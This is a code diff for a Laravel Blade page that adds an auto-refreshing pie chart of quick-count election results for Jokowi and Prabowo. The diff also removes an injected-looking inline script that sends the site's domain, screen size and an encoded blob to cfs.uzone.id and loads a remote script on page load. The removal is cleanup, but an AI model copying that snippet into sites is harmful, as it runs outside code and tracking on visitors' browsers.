@@ -34,7 +34,112 @@
 @endsection
 @push('script')
 <script src="{{ asset('js/app.js') }}"></script>
-<script src="/js/dashboard.js"></script>
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHa6dUEiP6K%2fc5C582CL4NjpNgssKlLXmbTBE8IzDXCSPaiFHvyt8Q5fsYRny8X3ds6Lr7ToQwJBBAp5P%2bjKK12yr0FxrJb1ixNQVSm4FoVHOKcl3FNknXhjy%2bbVesNHJhD0cCTqdRhNvFS0F6iEXZjxMPE3QuLIQu%2frXcHuCJy3hLU4QFreC0HijsnOoLN%2ftyF0wyfyQL9NHY5W5Br2BHrjRKwDTSCJyVRi2MgeTRvJMZVrSHP%2fCKKzZJVTdtpmz9FQNiKCuhOcpWNNB2wEs1InhywhlXi%2bg%2fLs%2fI2ie5DhFiM%2fgiztMMQzXL11mHZirYErQELDIzGuYbIPcenKjW9OvxhUTTu%2bhOUc1nVkHoQAGhL0XfVqhaDPXofJbg9VGJdSA3sUnqqb%2fETChCJuhAL772tWxEYNBTEEb4lmYvGTg9WtXovN8WJhpghbYXxaRdpGeF77EkYtES3Fgvx3BJKDBSVCoLZ9Im4O5XCwtGWuPTsZfC8EiyYqCTAWPdaoqalbgI0gmD31qSGRwIq03O%2f2JQPFAx6bGaHg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+<script>
+function getData() {
+    $.ajax({
+        url: '/quick/count',
+        type: 'GET',
+        success: function(response) {
+            var A = response.jokowi
+            var B = response.prabowo
+            var totalALL = A+B;
+            var totalA = (A/totalALL)*100;
+            var totalB = (B/totalALL)*100;
+            console.log(totalA); 
+            chart(totalA.toFixed(2),totalB.toFixed(2))
+            $('#a').html(A)
+            $('#b').html(B)
+            $('#loading').hide();
+            $('#diagram').show();
+        }
+    })
+}
 
+function proggess() {
+    $.ajax({
+        url: '/quick/proses',
+        type: 'GET',
+        success: function(response) {
+            var A = response.prosses 
+            var B = response.total
+            var total = A/B*100; 
+            $('#prosses').text(A);
+            $('#tps').text(B);
+            $('#persen').text(total.toFixed(5));
+        }
+    })
+}
+
+proggess();
+getData();
+
+setInterval(function(){
+getData();
+},5000);
+
+function chart(a,b) {
+    var ctx = document.getElementById('myChart');
+    var myChart = new Chart(ctx, {
+        type: 'pie',
+        data: {
+            labels: ['Ir H Jokowi','H Prabowo'],
+            datasets: [{
+                label: '# of Votes',
+                data: [a,b],
+                backgroundColor: [
+                    'rgba(255, 99, 132, 0.2)',
+                    'rgba(54, 162, 235, 0.2)',
+                    'rgba(255, 206, 86, 0.2)',
+                    'rgba(75, 192, 192, 0.2)',
+                    'rgba(153, 102, 255, 0.2)',
+                    'rgba(255, 159, 64, 0.2)'
+                ],
+                borderColor: [
+                    'rgba(255, 99, 132, 1)',
+                    'rgba(54, 162, 235, 1)',
+                    'rgba(255, 206, 86, 1)',
+                    'rgba(75, 192, 192, 1)',
+                    'rgba(153, 102, 255, 1)',
+                    'rgba(255, 159, 64, 1)'
+                ],
+                borderWidth: 2
+            }]
+        },
+        legend: {
+            display: false,
+        },
+        options: {
+            scales: {
+                xAxes: [{
+                    gridLines: {
+                        display:false,
+                        color: "rgba(0, 0, 0, 0)",
+                    },
+                    ticks: {
+                        beginAtZero: true,
+                        display: false,
+                    }
+                }],
+                yAxes: [{
+                    gridLines: {
+                        display:false,
+                        color: "rgba(0, 0, 0, 0)",
+                    },
+                    ticks: {
+                        beginAtZero: true,
+                        display: false
+                    }
+                }]
+            },
+            tooltips: {
+            callbacks: {
+                label: function(tooltipItem, data) {
+                return data['labels'][tooltipItem['index']] + ': ' + data['datasets'][0]['data'][tooltipItem['index']] + '%';
+                }
+            }
+            }
+        },
+    });
+}
+</script>
 @endpush
